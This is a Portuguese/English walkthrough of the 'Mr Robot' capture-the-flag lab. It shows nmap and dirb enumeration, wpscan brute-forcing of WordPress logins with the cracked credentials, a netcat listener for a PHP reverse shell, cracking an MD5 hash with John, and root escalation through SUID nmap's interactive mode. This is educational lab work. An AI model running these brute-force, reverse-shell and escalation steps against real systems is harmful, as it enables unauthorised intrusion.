After configure the vpn in my machine i started to scan the machine using nmap

```
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  closed http
443/tcp closed https
Too many fingerprints match this host to give specific OS details

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.35 seconds                                                          
```

I saw that it has an server running on this machine, so i tried this one, but it was useless. I decided to run dirb to find other links that i could use. That was the result:

```
GENERATED WORDS: 4612

---- Scanning URL: http://10.10.210.211/ ----
                                                                                                                                                          ==> DIRECTORY: http://10.10.210.211/0/
                                                                             ==> DIRECTORY: http://10.10.210.211/admin/
+ http://10.10.210.211/atom (CODE:301|SIZE:0)                               
                                                                             ==> DIRECTORY: http://10.10.210.211/audio/
                                                                             ==> DIRECTORY: http://10.10.210.211/blog/
                                                                             ==> DIRECTORY: http://10.10.210.211/css/
+ http://10.10.210.211/dashboard (CODE:302|SIZE:0)                          
+ http://10.10.210.211/favicon.ico (CODE:200|SIZE:0)                        
                                                                             ==> DIRECTORY: http://10.10.210.211/feed/
                                                                             ==> DIRECTORY: http://10.10.210.211/image/
                                                                             ==> DIRECTORY: http://10.10.210.211/Image/
                                                                             ==> DIRECTORY: http://10.10.210.211/images/
+ http://10.10.210.211/index.html (CODE:200|SIZE:1188)                      
+ http://10.10.210.211/index.php (CODE:301|SIZE:0)                          
+ http://10.10.210.211/intro (CODE:200|SIZE:516314)                         
                                                                             ==> DIRECTORY: http://10.10.210.211/js/
+ http://10.10.210.211/license (CODE:200|SIZE:309)                          
+ http://10.10.210.211/login (CODE:302|SIZE:0)                              
+ http://10.10.210.211/page1 (CODE:301|SIZE:0)                              
+ http://10.10.210.211/phpmyadmin (CODE:403|SIZE:94)                        
+ http://10.10.210.211/rdf (CODE:301|SIZE:0)                                
+ http://10.10.210.211/readme (CODE:200|SIZE:64)                            
+ http://10.10.210.211/robots (CODE:200|SIZE:41)                            
+ http://10.10.210.211/robots.txt (CODE:200|SIZE:41)                        
+ http://10.10.210.211/rss (CODE:301|SIZE:0)                                
+ http://10.10.210.211/rss2 (CODE:301|SIZE:0)                               
+ http://10.10.210.211/sitemap (CODE:200|SIZE:0)                            
+ http://10.10.210.211/sitemap.xml (CODE:200|SIZE:0)                        
                                                                             ==> DIRECTORY: http://10.10.210.211/video/
                                                                             ==> DIRECTORY: http://10.10.210.211/wp-admin/
+ http://10.10.210.211/wp-config (CODE:200|SIZE:0)                          
                                                                             ==> DIRECTORY: http://10.10.210.211/wp-content/
+ http://10.10.210.211/wp-cron (CODE:200|SIZE:0)                            
                                                                             ==> DIRECTORY: http://10.10.210.211/wp-includes/
+ http://10.10.210.211/wp-links-opml (CODE:200|SIZE:227)                    
+ http://10.10.210.211/wp-load (CODE:200|SIZE:0)                            
+ http://10.10.210.211/wp-login (CODE:200|SIZE:2671)                        
+ http://10.10.210.211/wp-mail (CODE:500|SIZE:3064)                         
+ http://10.10.210.211/wp-settings (CODE:500|SIZE:0)                        
+ http://10.10.210.211/wp-signup (CODE:302|SIZE:0)                          
+ http://10.10.210.211/xmlrpc (CODE:405|SIZE:42)                            
+ http://10.10.210.211/xmlrpc.php (CODE:405|SIZE:42)                        
                                                                            
---- Entering directory: http://10.10.210.211/0/ ----
                                                                             + http://10.10.210.211/0/atom (CODE:301|SIZE:0)                             
                                                                             ==> DIRECTORY: http://10.10.210.211/0/feed/
+ http://10.10.210.211/0/index.php (CODE:301|SIZE:0)                        
+ http://10.10.210.211/0/rdf (CODE:301|SIZE:0)                              
+ http://10.10.210.211/0/rss (CODE:301|SIZE:0)                              
+ http://10.10.210.211/0/rss2 (CODE:301|SIZE:0)                             
                                                                            
---- Entering directory: http://10.10.210.211/admin/ ----                                                           
^C> Testing: http://10.10.210.211/admin/about 
```

Estratégia:

- Verificar portas abertas
- Analisar possíveis diretórios
- utilizar o nikto
- fazer varredura nas imagens do site assim que tiver acesso à pasta
- Usar user-agent especificado

Fiz o download da wordlist especificada e tratei de eliminar todas as duplicatas da lista.

```
sort fsocity.dic | uniq > fsocity-sorted.dic
```

E depois disso, tentei utilizar força bruta para identificar o login e senha. Testei alguns nomes comuns na série e vi Elliot como o login. Depois disso eu rodei o wpscan

```
wpscan --url http://10.10.228.141/wp-login.php?action=lostpassword --usernames Elliot --passwords fsocity-sorted.dic
```

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.228.141/wp-login.php?action=lostpassword/ [10.10.228.141]
[+] Started: Tue Mar  1 16:15:38 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Powered-By: PHP/5.5.29
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.228.141/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.228.141/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://10.10.228.141/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.228.141/e7fd0cc.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.228.141/e7fd0cc.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.228.141/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://10.10.228.141/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://10.10.228.141/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.228.141/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:14 <=====================================> (137 / 137) 100.00% Time: 00:00:14

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot / ER28-0652                                                                                      
All Found                                                                                                           
Progress Time: 00:00:41 <===============================                           > (12 / 22) 54.54%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Mar  1 16:16:49 2022
[+] Requests Done: 188
[+] Cached Requests: 6
[+] Data Sent: 54.814 KB
[+] Data Received: 1.501 MB
[+] Memory used: 251.918 MB
[+] Elapsed time: 00:01:10

```

Olhando no site, vi que havia outro usuário. Utilizei de novo o wpscan e este foi o resultado:

```
┌──(root㉿kali)-[/home/ellie/Downloads]
└─# wpscan --url http://10.10.228.141/wp-login.php?action=lostpassword --usernames  mich05654 --passwords fsocity-sorted.dic
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.228.141/wp-login.php?action=lostpassword/ [10.10.228.141]
[+] Started: Tue Mar  1 16:35:06 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Powered-By: PHP/5.5.29
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.228.141/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.228.141/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://10.10.228.141/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.228.141/ac294cd.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.228.141/ac294cd.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.228.141/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://10.10.228.141/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://10.10.228.141/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.228.141/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:08 <=====================================> (137 / 137) 100.00% Time: 00:00:08

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - mich05654 / Dylan_2791                                                                                  
All Found                                                                                                           
Progress Time: 00:01:05 <=============================                             > (11 / 22) 50.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mich05654, Password: Dylan_2791

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Mar  1 16:36:33 2022
[+] Requests Done: 187
[+] Cached Requests: 6
[+] Data Sent: 54.468 KB
[+] Data Received: 1.399 MB
[+] Memory used: 250.863 MB
[+] Elapsed time: 00:01:26
```

Adicionei um listener para escutar o shell reverse

```rlwrap nc -lvnp 53```

Depois disso eu procurei por um shell reverse por arquivos .php

Achando, eu coloquei no arquivo desejado, copiei e colei no arquivo desejado e então eu carreguei a página do arquivo desejado. O listener captou a seguinte mensagem:

```
listening on [any] 53 ...
connect to [10.9.3.140] from (UNKNOWN) [10.10.171.212] 56885
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 20:18:48 up  2:24,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
```
Comprovei que estava num shell reverse com os seguintes comandos e resultados:
```
whoami
daemon
hostname
linux
```
Depois disso, fui analisar os usuários disponíveis na máquina com o comando:

```ls /home```

```
robot
```

Entrei nesse diretório com o comando cd e verifiquei com o ls os arquivos

```
key-2-of-3.txt
password.raw-md5
```

Tentei ler o arquivo, mas sem sucesso. Verifiquei se eu tenho permissão para ver esse arquivo com o comando ```ls -lsa```

```
total 16
4 drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
4 drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
4 -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
4 -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

Vi que a chave não estava disponível para mim, porém a permissão me dava acesso para ler a senha e assim o fiz:

```cat password.raw-md5```

```robot:c3fcd3d76192e4007dfb496cca67e13b```

Vou identificar qual o hash da mensagem:

```hash-identifier```

```
Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
```

E depois disso rodei o John the ripper:

```
john -wordlist=fsocity.dic m5.hash --format=Raw-MD5
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2022-03-02 18:13) 0g/s 3300Kp/s 3300Kc/s 3300KC/s 8output..ABCDEFGHIJKLMNOPQRSTUVWXYZ
Session completed.
```

Assim, a senha descriptografada é ABCDEFGHIJKLMNOPQRSTUVWXYZ

Utilizei o seguinte comando:

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

e então eu loguei no sistema.

Achei, assim, a segunda flag

## Terceira flag

Procurei por arquivos com binários diferentes usando o comando:

```
find / -perm +6000 2>/dev/null | grep '/bin/'
```

Site gtofbins ajuda a usar ferramentas

```
/usr/local/bin/nmap --interactive
```

```
!sh
```